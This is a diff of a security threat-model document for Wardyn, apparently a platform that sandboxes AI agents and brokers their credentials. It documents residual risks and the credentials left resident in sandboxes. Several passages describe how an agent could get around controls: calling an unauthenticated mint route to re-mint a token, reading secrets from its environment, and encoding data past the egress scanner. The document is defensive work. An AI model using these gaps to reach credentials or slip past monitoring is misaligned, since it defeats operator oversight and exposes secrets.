+    pinned by `TestWorkspaceOwner_NoImpersonation`) and every such event carries
+    `workspace_owner`. Nothing asks a second human to approve it, nothing notifies
+    the member, and an admin who can rewrite the audit store at the database level
+    is bounded only by the hash chain's tamper-EVIDENCE (§4.5). The workspace-noun
+    instance of residual #14's one-operator-tier, bounded the same way.
 
-28. **A configured `WARDYN_TRUSTED_CA_FILE` makes the corporate middlebox a
-    trusted issuer for `wardynd`, every proxy sidecar, and every sandbox — not
-    merely tolerated on one hop.** The bundle is additive to the system roots,
-    so for as long as the knob is set the middlebox can read and rewrite
-    anything any of the three processes send over TLS: `wardynd`'s own OIDC
-    discovery, GitHub App transport, and audit-webhook calls (all ride the one
-    mutated `http.DefaultTransport`); the proxy sidecar's forward and
-    control-plane transports; and — because `installSandboxTrustedCA` appends
-    the same PEM into the sandbox's own CA trust — the agent's own TLS clients
-    on a passthrough (non-MITM'd) CONNECT tunnel too. Wardyn's own
-    inspection/masking (the `llm_inspection` guardrail, the per-run MITM CA)
-    sits INSIDE that envelope, not above it: a middlebox positioned to re-sign
-    wardynd's own OIDC/audit egress is positioned to re-sign whatever Wardyn
-    itself re-signs. There is no certificate pinning anywhere this trust
-    applies — the bound is scope, not depth: the PEM is operator-set at
-    process boot only (a flag/env value read once, never a `SiteConfig` field
-    an admin API write or a member could reach, never agent-reachable),
-    additive to the system bundle rather than a wholesale replacement, and
-    named honestly in `docs/OPERATIONS.md` and
-    `docs/adoption/corp-image-authoring.md` rather than silently assumed. A
-    BYOI base missing every system CA-bundle path loses public trust for its
-    OpenSSL-shaped clients entirely once this is set (residual 13's BYOI
-    trust boundary, sharpened) — a named, accepted ceiling, not a gap.
-29. **The operator's model-provider credential is disclosed to whatever host
-    they nominate as the internal gateway.** `WARDYN_ANTHROPIC_BASE_URL`/
+28. **A configured `WARDYN_TRUSTED_CA_FILE` makes the corporate middlebox a trusted
+    issuer for `wardynd`, every proxy sidecar, and every sandbox — not merely
+    tolerated on one hop.** The bundle is additive to the system roots, so while the
+    knob is set the middlebox can read and rewrite anything the three processes send
+    over TLS: `wardynd`'s own OIDC discovery, GitHub App transport and audit-webhook
+    calls (all on the one mutated `http.DefaultTransport`); the proxy sidecar's
+    forward and control-plane transports; and — because `installSandboxTrustedCA`
+    appends the same PEM into the sandbox's CA trust — the agent's TLS clients on a
+    passthrough (non-MITM'd) CONNECT tunnel. Wardyn's own inspection/masking (the
+    `llm_inspection` guardrail, the per-run MITM CA) sits INSIDE that envelope, not
+    above it. There is no certificate pinning anywhere this trust applies — the
+    bound is scope, not depth: the PEM is operator-set at process boot only (read
+    once, never a `SiteConfig` field an admin API write or a member could reach,
+    never agent-reachable), additive rather than a replacement, and named in
+    `docs/OPERATIONS.md` and `docs/adoption/corp-image-authoring.md`. A BYOI base
+    missing every system CA-bundle path loses public trust for its OpenSSL-shaped
+    clients entirely once this is set (residual #13 sharpened) — a named, accepted
+    ceiling, not a gap.
+
+29. **The operator's model-provider credential is disclosed to whatever host they
+    nominate as the internal gateway.** `WARDYN_ANTHROPIC_BASE_URL` /
     `WARDYN_OPENAI_BASE_URL` (`internal/api/llm_gateway.go`,
     `Proxy.vetTrustedHost`/`Proxy.gatewayTarget`) re-point the api-key lane's
-    brokered credential injection at a control-plane-authored host — the
-    same trust class as `WARDYN_TRUSTED_CA_FILE` above (boot-time only,
-    never a `SiteConfig` field, never agent-reachable). Once configured, the
-    live api-key credential (`buildInjector`'s minted grant) is sent to
-    that host on every model call; gateway-side retention, logging, or
-    forwarding of the plaintext key is outside Wardyn's boundary entirely —
-    the same trust an operator already extends to any corporate proxy they
-    nominate (`upstream_proxy_url`), stated explicitly here because a model
-    credential is higher-value than most. Bounded on every other axis: the
-    knob is validated at boot (`https://` only, no userinfo, the gateway
-    host must not equal the public provider host, loopback/link-
-    local/metadata/unspecified/multicast/NAT64-embedded literals refused —
-    RFC1918/CGNAT is the expected shape); only the proxy's own brokered
-    `/wardyn/llm/*` route (`Proxy.gatewayTarget`) ever resolves or dials the
-    gateway with that relaxed per-request vet, so there is no rebinding
-    window on THAT path — a sandbox that names the gateway host itself on
-    an ordinary CONNECT/MITM path is treated like any other host
-    (`Proxy.egressTarget`/`Proxy.vetHost`): policy plus the unconditional
-    private-IP guard apply unchanged, so a private-address gateway named by
-    HOSTNAME stays unreachable from the sandbox without its own
-    `SiteConfig.InternalHosts` declaration; and the veto in
-    `planArtifactRedirect` keeps an unrelated artifact-registry redirect from
-    ever colliding with the same host. **Literal-IP ceiling:** a gateway
-    configured by IP LITERAL (`https://10.40.1.5/v1`) must be listed by that
-    literal in `allowed_domains` (the api-key lane appends the provider host
-    to every grant, and boot warns without it), and an exact literal-IP
-    allowlist entry is honoured by `evaluate`'s step 0 (`Policy.AllowsLiteralIP`)
-    BEFORE the private-IP guard — so the gateway box itself is then
-    reachable from the sandbox on every port over a plain CONNECT (no
-    credential rides that path; injection only ever happens on the brokered
-    route). Prefer a hostname gateway; a literal-IP one accepts that
-    exposure.
-    **Scope, stated plainly:** only the api-key lane is redirected — a
-    subscription or Wardyn-managed run's credential still goes to
-    `api.anthropic.com` directly, unaffected by this knob.
+    brokered credential injection at a control-plane-authored host — the same trust
+    class as `WARDYN_TRUSTED_CA_FILE` (boot-time only, never a `SiteConfig` field,
+    never agent-reachable). Once configured, the live api-key credential
+    (`buildInjector`'s minted grant) is sent to that host on every model call;
+    gateway-side retention, logging or forwarding of the plaintext key is outside
+    Wardyn's boundary entirely — the same trust an operator extends to any corporate
+    proxy they nominate (`upstream_proxy_url`), stated explicitly because a model
+    credential is higher-value than most.
 
-30. **`/healthz` is anonymous and now also names the k8s substrate's
-    NetworkPolicy posture, not merely its confinement classes.** `handleHealthz`
-    already discloses `confinement_classes` to any unauthenticated caller
-    (residual/rationale above); it now adds `network_policy`
-    (`k8sNetpolVerdict`'s "enforced"/"unenforced"/"acknowledged"), present only
-    on a k8s substrate and omitted entirely elsewhere. This is the same
-    disclosure class as the fields beside it — a runtime posture fact, not a
-    credential or a topology detail — and it lets an operator's own monitoring
-    catch an unenforced-but-allowed cluster without an admin token.
+    Bounded on every other axis: validated at boot (`https://` only, no userinfo,
+    the gateway host must not equal the public provider host,
+    loopback/link-local/metadata/unspecified/multicast/NAT64-embedded literals
+    refused — RFC1918/CGNAT is the expected shape); only the brokered
+    `/wardyn/llm/*` route (`Proxy.gatewayTarget`) resolves or dials the gateway with
+    the relaxed per-request vet, so there is no rebinding window on THAT path — a
+    sandbox naming the gateway host on an ordinary CONNECT/MITM path is treated like
+    any other (`Proxy.egressTarget`/`Proxy.vetHost`: policy plus the unconditional
+    private-IP guard apply unchanged, so a private-address gateway named by HOSTNAME
+    stays unreachable without its own `SiteConfig.InternalHosts` declaration); and
+    `planArtifactRedirect`'s veto keeps an artifact-registry redirect from colliding
+    with the same host. **Literal-IP ceiling:** a gateway configured by IP LITERAL
+    (`https://10.40.1.5/v1`) must be listed by that literal in `allowed_domains`,
+    and an exact literal-IP entry is honoured by `evaluate`'s step 0
+    (`Policy.AllowsLiteralIP`) BEFORE the private-IP guard — so the gateway box is
+    then reachable from the sandbox on every port over a plain CONNECT (no
+    credential rides that path; injection only happens on the brokered route).
+    Prefer a hostname gateway. **Scope:** only the api-key lane is redirected — a
+    subscription or Wardyn-managed run's credential still goes to
+    `api.anthropic.com` directly.
+
+30. **`/healthz` is anonymous and now also names the k8s substrate's NetworkPolicy
+    posture, not merely its confinement classes.** `handleHealthz` already discloses
+    `confinement_classes` to any unauthenticated caller; it now adds
+    `network_policy` (`k8sNetpolVerdict`'s "enforced"/"unenforced"/"acknowledged"),
+    present only on a k8s substrate. Same disclosure class as the fields beside it —
+    a runtime posture fact, not a credential or a topology detail — and it lets an
+    operator's own monitoring catch an unenforced-but-allowed cluster without an
+    admin token.
 
 ### 5.1a LLM egress content inspection — the honest-claims contract
 
@@ -911,164 +875,195 @@ exactly these terms.
   HONEST agent's inadvertent inclusion (the Samsung-ChatGPT class) and record a
   CONTENT-FREE audit event (`llm.scan.*`).
 - A guardrail that **complements, does not replace,** the structural controls.
-- Per-mode coverage reported honestly: an OPT-IN per-run TLS-MITM (`intercept_tls`)
-  now makes the subscription-OAuth Anthropic path and the OpenAI/Codex path
-  **inspectable** (the proxy terminates TLS with a per-run CA whose PRIVATE key
-  never enters the sandbox; the sandbox trusts only the public cert). Without
-  `intercept_tls`, those CONNECT tunnels stay **opaque and flagged `llm.scan.blind`**;
-  Bedrock stays opaque regardless (client-side SigV4 cannot be re-forwarded). The
-  `require_inspectable_llm` policy fails an opaque-transport run **closed** at
-  schedule time for strict operators.
+- Per-mode coverage reported honestly: an OPT-IN per-run TLS-MITM
+  (`intercept_tls`) makes the subscription-OAuth Anthropic path and the
+  OpenAI/Codex path **inspectable** (the proxy terminates TLS with a per-run CA
+  whose PRIVATE key never enters the sandbox; the sandbox trusts only the public
+  cert). Without `intercept_tls`, those CONNECT tunnels stay **opaque and flagged
+  `llm.scan.blind`**; Bedrock stays opaque regardless (client-side SigV4 cannot be
+  re-forwarded). The `require_inspectable_llm` policy fails an opaque-transport run
+  **closed** at schedule time for strict operators.
 - Detections recorded **without storing the secret** — detector + field path +
   offset + count + masked placeholder only; never the matched bytes, never a
-  reversible hash (the audit log is append-only and SIEM-fanned).
-
-**Resident-secret exceptions — the complete, authoritative list.** Wardyn's
-default invariant is "no resident secrets": a credential is late-bound by the
-broker and injected proxy-side, so the sandbox process never holds it. The table
-below is the COMPLETE set of places a live credential does land inside a sandbox
-— §4 and §8 point here rather than restating a count, because a hardcoded count
-is exactly how this list drifted before. Each row states what lands, why it
-cannot be proxy-injected, and what bounds it; where a bound does not exist, it
-says so.
-
-| Exception | What lands in the sandbox | Why it can't be proxy-injected | Bounds (and their limits) |
-|---|---|---|---|
-| `ssh_key` grant (SSH SCM lane) | The stored SSH **private key**, as a file the `ssh` client reads | git's SSH transport has no credential-helper seam (`credential.helper` is HTTP-only) | Written `0400` agent-owned at clone time and shredded right after the clone (`wipe_ssh_grants`, before the agent process starts); mask-registered at mint. **On an UNBROKERED forge** (`dev.azure.com`, or a `github.com` grant with no co-granted `github_token`) that window is a narrowing, not a bound: the grant id rides `WARDYN_SSH_GRANTS` in the sandbox env, an auto-mintable grant is re-mintable by design (`MintForGrant`), and the proxy's mint route refuses only brokered *GitHub* grant ids (`isBrokeredGitGrant`) — so the agent process can re-mint the same key at any point in the run. **On a BROKERED forge this no longer applies:** `validateGrantLaneExclusivity` (`internal/api/policy.go`) refuses a policy declaring both a `github_token` and an `ssh_key` grant for the same forge at write time, and for anything already stored, dispatch's `dropBrokeredGrants` withholds the grant from `WARDYN_SSH_GRANTS` entirely — no grant id reaches the sandbox, so there is nothing to re-mint — while `confineGitBrokerEgress` denies `ssh.<forge>` alongside the four HTTPS hosts. Wardyn cannot down-scope or expire an SSH private key in the cases it does remain resident (`internal/broker/broker.go` `mintSSHKey`, `deploy/images/*/agent-run`). |
-| `git_pat` grant (Azure DevOps / GitLab) | The **PAT value**, streamed from `wardyn-git-helper` to the sandbox's `git` process | git-over-HTTPS to ADO/GitLab is an opaque CONNECT tunnel the proxy cannot inject Basic auth into without MITM | Helper emission is gated on a per-run `0400` caller-auth secret; the value is mask-registered at mint. **A `run`-scoped approval takes a per-run LEASE on this kind** (v0.6, opt-in per decision, `broker.leaseCoversRemint`): one human decision then re-mints the same grant for the rest of the run instead of raising a fresh approval per git operation. That widens what one approval authorizes and is published as such — each leased mint is stamped `lease: true` on its `credential.mint` event, the lease is `git_pat`-only and per-SCOPE, and it dies with the run: a leased re-mint still runs the whole mint transaction, so `runRevoked` refuses it once the kill-switch cascade commits. The comparison is against the RAW stored `decision_scope`, never `ApprovalScope.Normalize()`d, so no approval decided before v0.6 leases anything. What the lease does NOT change is the residual below. That gate binds a caller going through `wardyn-git-helper` itself — it does not bind the credential at its source: the proxy's local mint route (`POST /wardyn/v1/credentials/mint`) is itself unauthenticated, so a caller that reads the grant id straight out of the sandbox env and POSTs the route directly is not bound at all. **No expiry, no down-scoping** — Wardyn holds an operator-provisioned PAT and can only forward it (no ADO/GitLab token-minting integration); that is this grant kind's honesty ceiling. GitHub's *transport* is the contrast the ADO design targets — a granted repo's git traffic is rewritten (`insteadOf`) to the proxy-side git broker, which mints the App installation token SERVER-side and re-originates with it, so the clone/push itself never carries a token into the sandbox, and dispatch subtracts + denies the broker-managed GitHub hosts for any run with git grants, so there is no direct route either. On a **brokered** run — one the broker actually serves at least one repo for (`WARDYN_GIT_BROKER_REPOS` non-empty, the same map that drives the deny) — the helper REFUSES every GitHub host **and** the proxy's mint route refuses that grant id, so the installation token is not obtainable from inside the sandbox even though the grant id itself rides the agent env: the contrast with the ADO PAT is structural there, not just scope+TTL. A `github_token` grant that covers **no** repo is NOT brokered — no `/wardyn/gh/` route, no injected deny — and it also mints nothing by any path: `MintInstallationToken` refuses an empty repo list outright (`broker: github token requires at least one repo`), so the helper's mint returns an error and no token reaches the sandbox. That shape is an inert grant, not a `git_pat`-grade resident credential. |
-| `env_secret` grant (arbitrary tool auth) | The stored secret's **value**, as a sandbox environment variable the operator names (`{"name":"MY_TOKEN","secret_name":"…"}`) | Nothing structural — this is a COVERAGE gap, not an impossibility. A PAT-authenticated CLI or REST tool reads a `*_TOKEN` env var; `git_pat` wires git's credential helper only, and `api_key` injects one header at one host, so neither reaches it. A per-tool proxy shim could, and none exists (`docs/adoption/corp-network-onboarding-findings.md` B1) | **The weakest bounds of any row here, and the kind is designed that way — read them before enabling it.** Resolved at dispatch (`api.resolveEnvSecretGrants`), mask-registered for the run, and never written to the audit stream (the `run.env_secret.resolve` event carries the variable name and the SECRET name, never the value). Beyond that: **resident for the WHOLE run** — unlike `ssh_key`'s clone window, an env var lives as long as the process tree, and anything running as the agent uid reads it from `/proc/self/environ`; **no mint, no TTL, no JTI** (the broker refuses the kind outright — `mintKind` returns `ErrUnknownGrantKind`), so there is nothing for the kill-switch cascade to revoke — killing the run stops the process but does not un-disclose the secret; and **no expiry or down-scoping**, the same honesty ceiling `git_pat` carries, since Wardyn only forwards an operator-provisioned value. What IS bounded: the variable name is `[A-Z_][A-Z0-9_]*` and may not start with `WARDYN_` (write time), the secret may not be a reserved platform-internal name (write time AND at the dispatch sink), the grant may not overwrite a variable dispatch already set, `requires_approval` is REFUSED rather than silently ignored (there is no mint to gate), and the kind is **admin-only by default** — a member's `env_secret` grant is dropped even for a ceiling-listed pairing unless the operator sets `WARDYN_ALLOW_MEMBER_ENV_SECRET`. Prefer `api_key` (never resident) whenever the tool can be pointed at a host + header instead. |
-| Bedrock **access-key** mode | `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` (+ optional `AWS_SESSION_TOKEN`) in the sandbox env | AWS SigV4 signs each request **in-process** — there is no static header for the proxy to strip and replace | Per-run output masking (PTY/recordings); withheld from non-model (verify/scan) runs; the three secret names are reserved at the broker sink, so no `git_pat`/`ssh_key` grant can resolve them into the sandbox. IAM least-privilege scoping — ideally short-TTL STS creds scoped to one inference profile — is the **operator's** responsibility; Wardyn neither enforces nor verifies it. |
-| Bedrock **captured-AWS-SSO** mode (containerized `aws sso login`) | A minimal synthetic `~/.aws`: a generated `config` plus the **SSO token cache** (`sso/cache/<sha1>.json`) carrying the SSO **access token** — and the refresh token / client id + secret when the login also registered a client. Delivered base64 in a sandbox env var, materialized by `agent-run`. | Nothing structural — this is a **not-yet-built** gap, not an impossibility. `portal.sso.<region>` `GetRoleCredentials` is `authtype:none`, so a MITM could carry the token as the `x-amz-sso_bearer_token` **header** and keep it out of the sandbox entirely (the "Phase B" never-resident alternative, mirroring Bedrock bearer mode). Until that ships, the token is written into the sandbox. | Files written `0600`; the token values are mask-registered **globally**, not per-run (one capture is reused across runs) — access + refresh at capture, access + refresh + client secret again at use; a lapsed token is detected before dispatch and the run falls through to the next credential mode rather than being handed a dead token; withheld from non-model runs; the capture login run is never recorded. **Not bounded:** masking is verbatim-match only, so the base64-encoded copy carried in the env var is not matched, and Wardyn cannot revoke an SSO session. |
-| **Derived AWS role credentials** (every SigV4 Bedrock mode) | The short-lived role credentials the in-sandbox AWS SDK mints for itself from the SSO session (`portal.sso.<region>` `GetRoleCredentials`) | Same as access-key mode: SigV4 signs in-process, so these stay resident **regardless** of how the SSO session reached the sandbox — Phase B would end the SSO token's residency, not theirs | Bounded only by their own STS lifetime and the IAM role's scope, both set outside Wardyn. Wardyn never sees these values, so they are **not** mask-registered and cannot be masked. |
-| Bedrock **host `~/.aws` mount** (`WARDYN_BEDROCK_AWS_DIR`) | Whatever the operator's host `~/.aws` holds — the SSO token cache, and any static keys in it — readable at `/home/agent/.aws` | The AWS SDK resolves credentials from the file itself | Bind-mounted **read-only**, so the sandbox can never write the operator's host AWS state; nothing is stored by Wardyn and no keys go into env. Wardyn never reads the contents, so it cannot mask them. A single-user / self-hosted choice, not for a shared multi-tenant service. |
-| Subscription `~/.claude` mount, **`WARDYN_SUBSCRIPTION_INJECT=off` only** | A real, refreshable **copy** of the operator's Claude OAuth credentials | With injection off there is no proxy-side token provider to inject from (the distroless compose `wardynd` carries no `claude` binary of its own) | **Mode-dependent — read the defaults carefully.** With injection ON (the host-mode default) the staged `.credentials.json` is sanitized to an inert sentinel (refresh token blanked, access token replaced, expiry pinned), so nothing usable is resident. The **compose stack defaults this env var to `off`**, so on that stack the resident copy is the default. The mount is read-only, and it lands only when the run's resolved `ai_provider` integration is a `resident_host` `anthropic_subscription` (a workspace pin or the operator's `DefaultFor: agent_runs` default) against an operator-blessed ceiling mount. |
-| Container-**login** runs (`harness login`) | The credential the run exists to obtain: `claude setup-token` prints it to the PTY; `aws sso login` writes it to `~/.aws/sso/cache` before `wardyn-aws-sso` uploads it | The credential does not exist yet — there is nothing to inject | A throwaway box: no workspace, no repo, no credential mounts, mints nothing (the AWS flow is seeded with one NON-secret file — a `~/.aws/config` holding the operator's SSO start URL + region, which `aws sso login` cannot run without), default-deny egress pinned to the login flow's hosts, idle auto-stop. **Never recorded** — the recorder is dropped entirely for a `harness login` run, so no replayable asciicast is persisted (masking could not have covered it: the value arrives after the run's mask snapshot). |
-
-Everything else is never-resident — `api_key`, the Bedrock **bearer** token
-(`bedrock-api-key`), and the default proxy-injected subscription: the value is
-resolved at the injection sink or re-originated proxy-side, and the sandbox
-holds only a placeholder or an inert sentinel. GitHub's `github_token` sits
-between the two lists: its git *transport* is never-resident (broker-injected,
-see the `git_pat` row), but the credential helper can still mint it in-sandbox.
-Bedrock bearer mode is therefore the one to prefer when the never-resident
-posture matters: a bearer token is a *static* `Authorization` header, so the
-proxy TLS-MITMs `bedrock-runtime.*` and injects it exactly like an api-key (the
-CA private key stays in proxy memory; the host is an exact, non-wildcard
-operator-configured MITM entry with a paired injection rule — the
-corp-artifact-host trust boundary in `isMITMHost`).
+  reversible hash.
 
 **Wardyn may NOT claim (these would repeat the industry's egress-veto overclaim):**
 - "Prevents/blocks data exfiltration to the model," "exfil-proof," or "DLP." An
   agent can encode / split-across-turns / encrypt around any scanner — residual #1
-  STANDS; this guardrail does not move it.
+  STANDS.
 - "Detects all secrets and PII." The detectors are: declared known-secret VALUES
   (exact, default), an OPT-IN regex catalog of well-known secret FORMATS
-  (`detect_secret_patterns`; high precision, can FP on example keys), and an OPT-IN
+  (`detect_secret_patterns`; high precision, can FP on example keys), an OPT-IN
   Shannon-entropy detector (`detect_entropy`; high-FP in code, pure-hex skipped,
   medium severity so `block_min_severity` can exclude it), an OPT-IN regex/Luhn PII
   detector (`detect_pii`; ≈60-70% recall = high false-negative — visibility, NEVER
-  a control), and an OPT-IN out-of-process detection sidecar (`detector_sidecar_url`;
-  e.g. Presidio/LLM-Guard — fail-open by default, fail-closed under
-  `on_scanner_error=block`). None is exhaustive; entropy and
-  PII in particular are best-effort. Detections stay content-free regardless of
-  detector (type + location + masked placeholder only).
+  a control), and an OPT-IN out-of-process sidecar (`detector_sidecar_url`; e.g.
+  Presidio/LLM-Guard — fail-open by default, fail-closed under
+  `on_scanner_error=block`). None is exhaustive; entropy and PII in particular are
+  best-effort. Detections stay content-free regardless of detector.
 - "Protects all LLM traffic" — Bedrock (SigV4) stays opaque, and any run without
   `intercept_tls` leaves subscription/OAuth tunnels uninspected (flagged blind).
 - "Safely redacts prompts" — redaction is deferred (it can corrupt tool I/O and
   prompt caching, and may strip a value the model legitimately needs).
+
+**Resident-secret exceptions — the complete, authoritative list.** Wardyn's default
+invariant is "no resident secrets": a credential is late-bound by the broker and
+injected proxy-side, so the sandbox process never holds it. The table below is the
+COMPLETE set of places a live credential does land inside a sandbox — §4 and §8
+point here rather than restating a count, because a hardcoded count is exactly how
+this list drifted before. Each row states what lands, why it cannot be
+proxy-injected, and what bounds it; where a bound does not exist, it says so.
+
+| Exception | What lands in the sandbox | Why it can't be proxy-injected | Bounds (and their limits) |
+|---|---|---|---|
+| `ssh_key` grant (SSH SCM lane) | The stored SSH **private key**, as a file the `ssh` client reads | git's SSH transport has no credential-helper seam (`credential.helper` is HTTP-only) | Written `0400` agent-owned at clone time, shredded right after (`wipe_ssh_grants`, before the agent starts); mask-registered at mint. On an UNBROKERED forge that window is a narrowing, not a bound; on a BROKERED forge the grant never reaches the sandbox. Wardyn cannot down-scope or expire an SSH private key where it does remain resident (`internal/broker/broker.go` `mintSSHKey`, `deploy/images/*/agent-run`). See below. |
+| `git_pat` grant (Azure DevOps / GitLab) | The **PAT value**, streamed from `wardyn-git-helper` to the sandbox's `git` process | git-over-HTTPS to ADO/GitLab is an opaque CONNECT tunnel the proxy cannot inject Basic auth into without MITM | Helper emission is gated on a per-run `0400` caller-auth secret and the value is mask-registered at mint — but that gate binds only a caller going through `wardyn-git-helper`: the proxy's local mint route (`POST /wardyn/v1/credentials/mint`) is itself unauthenticated, so a caller that reads the grant id straight out of the sandbox env and POSTs the route directly is not bound at all. **No expiry, no down-scoping.** See below. |
+| `env_secret` grant (arbitrary tool auth) | The stored secret's **value**, as a sandbox environment variable the operator names (`{"name":"MY_TOKEN","secret_name":"…"}`) | Nothing structural — a COVERAGE gap, not an impossibility. A PAT-authenticated CLI or REST tool reads a `*_TOKEN` env var; `git_pat` wires git's credential helper only and `api_key` injects one header at one host, so neither reaches it. A per-tool proxy shim could; none exists (`docs/adoption/corp-network-onboarding-findings.md` B1) | **The weakest bounds of any row here, and the kind is designed that way — read them before enabling it.** Resident for the WHOLE run; no mint, no TTL, no JTI, so nothing for the kill-switch to revoke; no expiry or down-scoping. See below. |
+| Bedrock **access-key** mode | `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` (+ optional `AWS_SESSION_TOKEN`) in the sandbox env | AWS SigV4 signs each request **in-process** — no static header for the proxy to strip and replace | Per-run output masking (PTY/recordings); withheld from non-model (verify/scan) runs; the three secret names are reserved at the broker sink, so no `git_pat`/`ssh_key` grant can resolve them into the sandbox. IAM least-privilege scoping — ideally short-TTL STS creds scoped to one inference profile — is the **operator's** responsibility; Wardyn neither enforces nor verifies it. |
+| Bedrock **captured-AWS-SSO** mode (containerized `aws sso login`) | A minimal synthetic `~/.aws`: a generated `config` plus the **SSO token cache** (`sso/cache/<sha1>.json`) carrying the SSO **access token** — and the refresh token / client id + secret when the login also registered a client. Delivered base64 in a sandbox env var, materialized by `agent-run`. | Nothing structural — a **not-yet-built** gap. `portal.sso.<region>` `GetRoleCredentials` is `authtype:none`, so a MITM could carry the token as the `x-amz-sso_bearer_token` **header** and keep it out of the sandbox entirely (the "Phase B" never-resident alternative). Until that ships, the token is written into the sandbox. | Files written `0600`; token values mask-registered **globally**, not per-run (one capture is reused across runs) — access + refresh at capture, access + refresh + client secret again at use; a lapsed token is detected before dispatch and the run falls through to the next credential mode rather than being handed a dead token; withheld from non-model runs; the capture login run is never recorded. **Not bounded:** masking is verbatim-match only, so the base64-encoded copy in the env var is not matched, and Wardyn cannot revoke an SSO session. |
+| **Derived AWS role credentials** (every SigV4 Bedrock mode) | The short-lived role credentials the in-sandbox AWS SDK mints for itself from the SSO session (`portal.sso.<region>` `GetRoleCredentials`) | Same as access-key mode: SigV4 signs in-process, so these stay resident **regardless** of how the SSO session reached the sandbox — Phase B would end the SSO token's residency, not theirs | Bounded only by their own STS lifetime and the IAM role's scope, both set outside Wardyn. Wardyn never sees these values, so they are **not** mask-registered and cannot be masked. |
+| Bedrock **host `~/.aws` mount** (`WARDYN_BEDROCK_AWS_DIR`) | Whatever the operator's host `~/.aws` holds — the SSO token cache, and any static keys in it — readable at `/home/agent/.aws` | The AWS SDK resolves credentials from the file itself | Bind-mounted **read-only**, so the sandbox can never write the operator's host AWS state; nothing is stored by Wardyn and no keys go into env. Wardyn never reads the contents, so it cannot mask them. A single-user / self-hosted choice, not for a shared multi-tenant service. |
+| Subscription `~/.claude` mount, **`WARDYN_SUBSCRIPTION_INJECT=off` only** | A real, refreshable **copy** of the operator's Claude OAuth credentials | With injection off there is no proxy-side token provider to inject from (the distroless compose `wardynd` carries no `claude` binary of its own) | **Mode-dependent — read the defaults carefully.** With injection ON (the host-mode default) the staged `.credentials.json` is sanitized to an inert sentinel (refresh token blanked, access token replaced, expiry pinned), so nothing usable is resident. The **compose stack defaults this env var to `off`**, so on that stack the resident copy is the default. The mount is read-only, and lands only when the run's resolved `ai_provider` integration is a `resident_host` `anthropic_subscription` (a workspace pin or the operator's `DefaultFor: agent_runs` default) against an operator-blessed ceiling mount. |
+| Container-**login** runs (`harness login`) | The credential the run exists to obtain: `claude setup-token` prints it to the PTY; `aws sso login` writes it to `~/.aws/sso/cache` before `wardyn-aws-sso` uploads it | The credential does not exist yet — there is nothing to inject | A throwaway box: no workspace, no repo, no credential mounts, mints nothing (the AWS flow is seeded with one NON-secret file — a `~/.aws/config` holding the operator's SSO start URL + region, which `aws sso login` cannot run without), default-deny egress pinned to the login flow's hosts, idle auto-stop. **Never recorded** — the recorder is dropped entirely for a `harness login` run (masking could not have covered it: the value arrives after the run's mask snapshot). |
+
+**`ssh_key` and `git_pat` — the brokered/unbrokered split** is stated once, in
+full, under asset #4 (§2). Two citations that live only here: on an unbrokered
+forge the grant id rides `WARDYN_SSH_GRANTS` and an auto-mintable grant is
+re-mintable by design (`MintForGrant`), because the proxy's mint route refuses
+only brokered *GitHub* grant ids (`isBrokeredGitGrant`); on a brokered forge
+`validateGrantLaneExclusivity` (`internal/api/policy.go`) refuses the policy at
+write time and `dropBrokeredGrants` withholds anything already stored, so no
+grant id reaches the sandbox and there is nothing to re-mint.
+
+**`git_pat` — the run lease.** A `run`-scoped approval takes a per-run LEASE on
+this kind (v0.6, opt-in per decision, `broker.leaseCoversRemint`): one human
+decision then re-mints the same grant for the rest of the run instead of raising
+a fresh approval per git operation. That widens what one approval authorizes and
+is published as such — each leased mint is stamped `lease: true` on its
+`credential.mint` event, the lease is `git_pat`-only and per-SCOPE, and it dies
+with the run (a leased re-mint still runs the whole mint transaction, so
+`runRevoked` refuses it once the kill-switch cascade commits). The comparison is
+against the RAW stored `decision_scope`, never `ApprovalScope.Normalize()`d, so
+no approval decided before v0.6 leases anything. The lease does not change the
+unauthenticated-mint-route residual above. Wardyn holds an operator-provisioned
+PAT and can only forward it — no ADO/GitLab token-minting integration exists, and
+that is this kind's honesty ceiling.
+
+**The GitHub contrast** the ADO design targets: a granted repo's git traffic is
+rewritten (`insteadOf`) to the proxy-side git broker, which mints the App
+installation token SERVER-side and re-originates with it, so the clone/push never
+carries a token into the sandbox. On a **brokered** run — one the broker serves at
+least one repo for (`WARDYN_GIT_BROKER_REPOS` non-empty, the same map that drives
+the deny) — the helper REFUSES every GitHub host **and** the proxy's mint route
+refuses that grant id, so the installation token is unobtainable from inside the
+sandbox even though the grant id rides the agent env. A `github_token` grant
+covering **no** repo is NOT brokered — no `/wardyn/gh/` route, no injected deny —
+and mints nothing by any path: `MintInstallationToken` refuses an empty repo list
+outright (`broker: github token requires at least one repo`). An inert grant, not
+a `git_pat`-grade resident credential.
+
+**`env_secret` — what IS bounded.** Resolved at dispatch
+(`api.resolveEnvSecretGrants`), mask-registered for the run, and never written to
+the audit stream (`run.env_secret.resolve` carries the variable name and the SECRET
+name, never the value). Unlike `ssh_key`'s clone window, an env var lives as long as
+the process tree and anything running as the agent uid reads it from
+`/proc/self/environ`; the broker refuses the kind for minting (`mintKind` returns
+`ErrUnknownGrantKind`), so killing the run stops the process but does not
+un-disclose the secret. Bounded: the variable name is `[A-Z_][A-Z0-9_]*` and may not
+start with `WARDYN_` (write time); the secret may not be a reserved
+platform-internal name (write time AND at the dispatch sink); the grant may not
+overwrite a variable dispatch already set; `requires_approval` is REFUSED rather
+than silently ignored (there is no mint to gate); and the kind is **admin-only by
+default** — a member's `env_secret` grant is dropped even for a ceiling-listed
+pairing unless the operator sets `WARDYN_ALLOW_MEMBER_ENV_SECRET`. Prefer `api_key`
+(never resident) whenever the tool can be pointed at a host + header instead.
+
+**Everything else is never-resident** — `api_key`, the Bedrock **bearer** token
+(`bedrock-api-key`), and the default proxy-injected subscription: the value is
+resolved at the injection sink or re-originated proxy-side, and the sandbox holds
+only a placeholder or an inert sentinel. GitHub's `github_token` sits between the
+two lists: its git *transport* is never-resident (broker-injected, see the `git_pat`
+row), but the credential helper can still mint it in-sandbox. Bedrock bearer mode is
+therefore the one to prefer when the never-resident posture matters: a bearer token
+is a *static* `Authorization` header, so the proxy TLS-MITMs `bedrock-runtime.*` and
+injects it exactly like an api-key (the CA private key stays in proxy memory; the
+host is an exact, non-wildcard operator-configured MITM entry with a paired
+injection rule — the corp-artifact-host trust boundary in `isMITMHost`).
 
 **Known v1 coverage gaps (recorded honestly; not silent):**
 - Only the **system prompt + the last message** of each turn are scanned. Secrets
   in earlier seeded messages, in a 2nd+ new message appended the same turn, or
